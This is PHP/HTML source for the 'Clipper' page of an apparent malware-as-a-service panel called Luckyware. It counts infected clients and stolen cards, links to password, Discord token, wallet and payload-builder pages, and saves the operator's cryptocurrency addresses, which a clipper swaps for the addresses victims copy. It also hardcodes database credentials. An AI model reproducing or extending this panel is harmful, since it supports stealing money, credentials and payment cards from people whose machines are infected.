<?php

session_start();
$domainyess = $_SERVER['HTTP_HOST'];
$secretkey = $_SESSION['secret_key'];
$username = $_SESSION['admin_name'];
$role = $_SESSION['Role'];

if (!isset($_SESSION['admin_name'])) {
    header('location:../Login/');
} else {

    if ($role == 'Trial') {
        header('location: https://' . $domainyess . '/Subscriptions');
    }

    $conn = mysqli_connect("localhost", "miner", "Sifre.12345", "luckyminer");


    if ($role == 'Founder') {

        $selectu = "SELECT * FROM miners";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE LastPing >= $fiveMinutesAgo";
    } else {
        $selectu = "SELECT * FROM miners WHERE OwnerID = '$secretkey'";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards WHERE OwnerID = '$secretkey'";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE OwnerID = '$secretkey' AND LastPing >= $fiveMinutesAgo";
    }

    $resultanss = mysqli_query($conn, $selectana);
    $myaktv = mysqli_num_rows($resultanss);
}

function sanitizeInput($input)
{
    // Define the list of forbidden characters
    $forbiddenChars = ['(', ')', '=', '*'];

    $isac = '0';
    // Check if the input contains any forbidden characters
    foreach ($forbiddenChars as $char) {
        if (strpos($input, $char) !== false) {
            // Forbidden character found, handle the error (you can customize this part)
            $isac = '1';
        }
    }

    if ($isac == '1') {

        return 'NoSpecialChar';
    } else {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }
}

$successMessage = '';
if (isset($_POST["save"])) {

    $BTC = sanitizeInput($_POST['btc']);
    $ETH = sanitizeInput($_POST['eth']);
    $LTC = sanitizeInput($_POST['ltc']);
    $XMR = $_POST['xmr'];
    $DOGE = sanitizeInput($_POST['doge']);
    $DASH = sanitizeInput($_POST['dash']);
    $XRP = sanitizeInput($_POST['xrp']);
    $NEO = sanitizeInput($_POST['neo']);


    $finalstring = $BTC . "|" . $ETH . "|" . $LTC . "|" . $XMR . "|" . $DOGE . "|" . $DASH . "|" . $XRP . "|" . $NEO . "|";
    $sql = "UPDATE accounts SET Wallets=? WHERE OwnerKey=?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $finalstring, $secretkey);

    if ($stmt->execute()) {
    } else {
    }
}

$BTCLAST;
$ETHLAST;
$LTCLAST;
$XMRLAST;
$DOGELAST;
$DASHLAST;
$XRPLAST;
$NEOLAST;


// Query to fetch the value from the "wallet" column
$sqlwallety = "SELECT Wallets FROM accounts WHERE OwnerKey = '$secretkey'"; // You need to specify your table and condition here

$resultwallety = mysqli_query($conn, $sqlwallety);

if ($resultwallety->num_rows > 0) {
    // Display the value from the "wallet" column
    $rowanan = $resultwallety->fetch_assoc();
    $walletValueRaw = $rowanan["Wallets"];
    $RealWallets = explode("|", $walletValueRaw);


    list($BTCADD, $ETHADD, $LTCADD, $XMRADD, $DOGEADD, $DASHADD, $XRPADD, $NEOADD, $dummy) = $RealWallets;

    if (empty($BTCADD)) {
        $BTCLAST = 'Addres Not Setted. Enter BTC Addres';
    } else {
        $BTCLAST = 'BTC Addres Is Setted To ' . $BTCADD;
    }

    if (empty($ETHADD)) {
        $ETHLAST = 'Addres Not Setted. Enter ETH Addres';
    } else {
        $ETHLAST = 'ETH Addres Is Setted To ' . $ETHADD;
    }

    if (empty($LTCADD)) {
        $LTCLAST = 'Addres Not Setted. Enter LTC Addres';
    } else {
        $LTCLAST = 'LTC Addres Is Setted To ' . $LTCADD;
    }

    if (empty($XMRADD)) {
        $XMRLAST = 'Addres Not Setted. Enter XMR Addres';
    } else {
        $XMRLAST = 'XMR Addres Is Setted To ' . $XMRADD;
    }

    if (empty($DOGEADD)) {
        $DOGELAST = 'Addres Not Setted. Enter DOGE Addres';
    } else {
        $DOGELAST = 'DOGE Addres Is Setted To ' . $DOGEADD;
    }

    if (empty($DASHADD)) {
        $DASHLAST = 'Addres Not Setted. Enter Dash Addres';
    } else {
        $DASHLAST = 'Dash Addres Is Setted To ' . $DASHADD;
    }

    if (empty($XRPADD)) {
        $XRPLAST = 'Addres Not Setted. Enter XRP Addres';
    } else {
        $XRPLAST = 'XRP Addres Is Setted To ' . $XRPADD;
    }

    if (empty($NEOADD)) {
        $NEOLAST = 'Addres Not Setted. Enter Solana Addres';
    } else {
        $NEOLAST = 'Solana Addres Is Setted To ' . $NEOADD;
    }
}

?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../assets/css/custom.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/hover.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="../../assets/fontaw/css/all.min.css">
    <script src="https://dooovid.github.io/smoothcaret/demo/smoothCaret.min.js" defer></script>
    <meta content="Luckyware" property="og:title" />
    <meta content="Luck is something you make and victory is something u take" property="og:description" />
    <meta content="https://<?php echo $domainyess; ?>" property="og:url" />
    <meta content="https://<?php echo $domainyess; ?>/icon.png" property="og:image" />
    <meta content="#e2ff85" data-react-helmet="true" name="theme-color" />
    <link rel="shortcut icon" href="https://<?php echo $domainyess; ?>/icon.png" />
    <title>Clipper</title>

    <style>
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #111111;
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 1;
            visibility: visible;
            /* Add visibility property */
            transition: all 1s ease;
            /* Longer transition and apply to all */
        }

        .loading-overlay.fade-out {
            opacity: 0;
            visibility: hidden;
            /* Hide element after fade */
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-radius: 50%;
            border-top-color: #850000;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body class="dg">
    <div class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>
    <div id="mobile topNav" class="bg xl:hidden"> <!-- MOBILE TOPNAV -->
        <div class="grid sm:grid-cols-2 px-5 py-3">
            <div class="1 text-left">
                <div class="flex">
                    <img class="w-12" src="https://<?php echo $domainyess; ?>/icon.png" alt="">
                    <h1 class="py-5 fntBold tracking-wide text-lg text-stone-300 ml-3">Luckyware <span
                            class="textCol">Dashboard</span></h1>
                </div>
            </div>
            <div class="2 text-right">
                <button class="text-xl text-stone-300 py-5"><i class="fa-solid fa-bars"></i></button>
            </div>
        </div>
    </div>

    <div class="grid xl:grid-cols-12"> <!-- start -->

        <div class="col-span-2 bg xl:grid sm:hidden pb-24 rounded-lg"> <!-- DESKTOP SIDENAV -->
            <div class="1">
               <div class="flex justify-center mt-10">
                    <h1 class="text-stone-300 fntBold text-2xl tracking-wide">
                        Lucky <span class="textCol">Ware</span>
                    </h1>
                </div>
                <div class="mx-5 mt-6">
                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Dashboard</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-house text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Builder';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Builder</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-hammer text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Passwords';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Password</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-key text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                   <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Wallets';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Wallets</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-wallet text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Tokens';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Tokens</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-brands fa-discord text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Automations';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Automations</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-play text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Clipper';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn border-b brdCol mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Clipper</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-clipboard textCol mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Cards';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Cards</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-credit-card text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Settings';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Settings</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-gear text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                    <button onclick="window.open('https://<?php echo $domainyess; ?>/Dashboard/Information', '_blank');"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Information</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-circle-info text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                </div>
            </div>
        </div>

        <div class="col-span-10 mx-5 mt-10"> <!-- CONTENT -->

            <div class="grid xl:grid-cols-4 sm:grid-cols-2 gap-5"> <!-- STATS -->

                <div class="1 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg w-96"><i
                                    class="fa-solid fa-earth-americas text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mytk; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="2 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-globe text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Active Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $myaktv; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="3 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-clipboard text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Cards</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mystole; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <a href="https://<?php echo $domainyess; ?>/Subscriptions" class="block">
                    <div class="4 bg rounded-lg px-5 py-5 btn cursor-pointer hover:opacity-90 transition">
                        <div class="grid grid-cols-3">
                            <div class="1 col-span-2">
                                <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                        class="fa-solid fa-money-bill text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                    Subscription</h1>
                            </div>
                            <div class="2 text-right">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                    <?php echo $role; ?>
                                </h1>
                            </div>
                        </div>
                    </div>
                </a>

            </div>

            <form method="post">

                <div class="grid xl:grid-cols-1 gap-5 mt-5">
                    <div class="1 bg rounded-lg pb-5 h-max btn2"><!-- clipper-->
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"> <i
                                        class="fa-solid fa-house-flood-water mr-1 icon2"></i> Clipper Crypto Addresses
                                </h1>
                            </div>
                            <div class="2 text-right">
                                <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-500"></h1>
                            </div>
                        </div>
                        <hr class="mx-5 mt-2 border-stone-800">

                        <div class="grid xl:grid-cols-2 gap-5 mx-5 mt-5">
                            <div class="1">

                                <div class="dg px-5 py-5 rounded-lg"><!--Bitcoin-->
                                    <div class="grid grid-cols-6">
                                        <div class="flex">
                                            <i class="fa-brands fa-btc text-3xl text-yellow-600"></i>
                                            <h1 class="ml-5 text-stone-300 fntBold tracking-wide text-lg mt-1">BTC
                                            </h1>
                                        </div>
                                        <div class="sc-container ml-5 col-span-5">
                                            <input id="btc" type="text" name="btc" data-sc="" class="smoothCaretInput rounded-lg bg px-3 text-stone-400"
                                                placeholder="<?php echo $BTCLAST; ?>" type="text">
                                            <div class="caret bgCol" style="width: 2px; height: 60%;"></div>
                                        </div>
                                    </div>
                                </div>

                                <div class="dg px-5 py-5 rounded-lg mt-5"><!--Litecoin-->
                                    <div class="grid grid-cols-6">
                                        <div class="flex">
                                            <i class="fa-solid fa-litecoin-sign text-3xl text-blue-800"></i>
                                            <h1 class="ml-5 text-stone-300 fntBold tracking-wide text-lg mt-1">LTC
                                            </h1>
                                        </div>
                                        <div class="sc-container ml-5 col-span-5">
                                            <input id="ltc" type="text" name="ltc" data-sc="" class="smoothCaretInput rounded-lg bg px-3 text-stone-400"
                                                placeholder="<?php echo $LTCLAST; ?>" type="text">
                                            <div class="caret bgCol" style="width: 2px; height: 60%;"></div>
                                        </div>
                                    </div>
                                </div>

                                <div class="dg px-5 py-5 rounded-lg mt-5"><!--Doge-->
                                    <div class="grid grid-cols-6">
                                        <div class="flex">
                                            <img src="../assets/img/doge.png" alt="">
                                            <h1 class="ml-5 text-stone-300 fntBold tracking-wide text-lg mt-0">Doge</h1>
                                        </div>
                                        <div class="sc-container ml-5 col-span-5">
                                            <input id="doge" type="text" name="doge" data-sc="" class="smoothCaretInput rounded-lg bg px-3 text-stone-400"
                                                placeholder="<?php echo $DOGELAST; ?>" type="text">
                                            <div class="caret bgCol" style="width: 2px; height: 60%;"></div>
                                        </div>
                                    </div>
                                </div>

                                <div class="dg px-5 py-5 rounded-lg mt-5"><!--XRP-->
                                    <div class="grid grid-cols-6">
                                        <div class="flex">
                                            <img src="../assets/img/xrp.png" alt="">
                                            <h1 class="ml-5 text-stone-300 fntBold tracking-wide text-lg mt-0">XRP</h1>
                                        </div>
                                        <div class="sc-container ml-5 col-span-5">
                                            <input id="xrp" type="text" name="xrp" data-sc="" class="smoothCaretInput rounded-lg bg px-3 text-stone-400"
                                                placeholder="<?php echo $XRPLAST; ?>" type="text">
                                            <div class="caret bgCol" style="width: 2px; height: 60%;"></div>
                                        </div>
                                    </div>
                                </div>

                            </div>

                            <div class="2">

                                <div class="dg px-5 py-5 rounded-lg"><!--Ethereum-->
                                    <div class="grid grid-cols-6">
                                        <div class="flex">
                                            <i class="fa-brands fa-ethereum text-3xl text-purple-600"></i>
                                            <h1 class="ml-5 text-stone-300 fntBold tracking-wide text-lg mt-1">ETH
                                            </h1>
                                        </div>
                                        <div class="sc-container ml-5 col-span-5">
                                            <input id="eth" type="text" name="eth" data-sc="" class="smoothCaretInput rounded-lg bg px-3 text-stone-400"
                                                placeholder="<?php echo $ETHLAST; ?>" type="text">
                                            <div class="caret bgCol" style="width: 2px; height: 60%;"></div>
                                        </div>
                                    </div>
                                </div>

                                <div class="dg px-5 py-5 rounded-lg mt-5"><!--XMR-->
                                    <div class="grid grid-cols-6">
                                        <div class="flex">
                                            <i class="fa-brands fa-monero text-3xl text-orange-600"></i>
                                            <h1 class="ml-5 text-stone-300 fntBold tracking-wide text-lg mt-1">XMR</h1>
                                        </div>
                                        <div class="sc-container ml-5 col-span-5">
                                            <input id="xmr" type="text" name="xmr" data-sc="" class="smoothCaretInput rounded-lg bg px-3 text-stone-400"
                                                placeholder="<?php echo $XMRLAST; ?>" type="text">
                                            <div class="caret bgCol" style="width: 2px; height: 60%;"></div>
                                        </div>
                                    </div>
                                </div>

                                <div class="dg px-5 py-5 rounded-lg mt-5"><!--Dash-->
                                    <div class="grid grid-cols-6">
                                        <div class="flex">
                                            <img class="" src="../assets/img/dash.png" alt="">
                                            <h1 class="ml-5 text-stone-300 fntBold tracking-wide text-lg mt-0">Dash</h1>
                                        </div>
                                        <div class="sc-container ml-5 col-span-5">
                                            <input id="dash" type="text" name="dash" data-sc="" class="smoothCaretInput rounded-lg bg px-3 text-stone-400"
                                                placeholder="<?php echo $DASHLAST; ?>" type="text">
                                            <div class="caret bgCol" style="width: 2px; height: 60%;"></div>
                                        </div>
                                    </div>
                                </div>

                                <div class="dg px-5 py-5 rounded-lg mt-5"><!--Neo-->
                                    <div class="grid grid-cols-6">
                                        <div class="flex">
                                            <img class="" src="../assets/img/solon.png" alt="">
                                            <h1 class="ml-5 text-stone-300 fntBold tracking-wide text-lg mt-0">SOL</h1>
                                        </div>
                                        <div class="sc-container ml-5 col-span-5">
                                            <input id="neo" type="text" name="neo" data-sc="" class="smoothCaretInput rounded-lg bg px-3 text-stone-400"
                                                placeholder="<?php echo $NEOLAST; ?>" type="text">
                                            <div class="caret bgCol" style="width: 2px; height: 60%;"></div>
                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>

                        <div class="mx-5 mt-5">
                            <button id="save" type="submit" name="save"
                                class="dg py-2 rounded-lg text-stone-400 fntBold tracking-wide btn hvr-underline-from-center w-full">
                                <i class="fa-solid fa-floppy-disk mr-1 icon"></i>
                                Save
                            </button>
                        </div>
            </form>

        </div>
    </div>
    </div>
    </div> <!-- end -->

    <script src="../assets/js/status.js"></script>
    <script src="../assets/js/builder.js"></script>

    <style>
        input::placeholder {
            color: #a8a29e;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Wait for fonts and stylesheets
            Promise.all([
                document.fonts.ready,
                new Promise(resolve => {
                    // Check if all stylesheets are loaded
                    const styleSheets = Array.from(document.styleSheets);
                    if (styleSheets.every(sheet => sheet.loaded !== false)) {
                        resolve();
                    } else {
                        window.addEventListener('load', resolve);
                    }
                })
            ]).then(() => {
                const overlay = document.querySelector('.loading-overlay');

                // Add the fade-out class
                overlay.classList.add('fade-out');

                // Remove the element after the transition completes
                overlay.addEventListener('transitionend', function() {
                    overlay.parentNode.removeChild(overlay);
                }, {
                    once: true
                });
            });
        });

        // Preload custom fonts if you're using any
        const fonts = ['Kanit'];
        fonts.forEach(font => {
            new FontFace(font, `url(path/to/${font}.woff2)`)
                .load()
                .then(loadedFont => document.fonts.add(loadedFont));
        });
    </script>
</body>

</html>